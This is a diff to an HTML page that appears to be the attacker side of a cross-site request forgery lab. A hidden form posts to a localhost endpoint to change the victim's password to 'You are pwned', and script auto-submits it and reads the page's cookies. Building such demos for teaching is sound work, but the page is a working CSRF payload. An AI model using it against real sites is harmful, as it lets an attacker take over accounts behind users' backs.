@@ -25,14 +25,16 @@
         </code>
       </div> 
     </div>
-    <form class="visually-hidden" action="{{csrf_endpoint}}" method="POST" id="update-form">
+    <form class="visually-hidden" action="http://127.0.0.1/csrf-attack/" method="POST" id="update-form" onsubmit="">
       <input class="visually-hidden" name="action" value="modify">
       <input class="visually-hidden" name="password" value="You are pwned at {{timestamp}}">
     </form>
     <script type="text/javascript">
       const cookie_el = document.querySelector('#cookies')
       cookie_el.innerText = document.cookie
-      document.forms[0].onsubmit  = function(event) {event.preventDefault()}
+      function onsubmit (event) {
+          event.preventDefault();        
+      }
       document.forms[0].submit()
       const root_el = document.querySelector("#root")
       const msg_el = document.createElement('p')
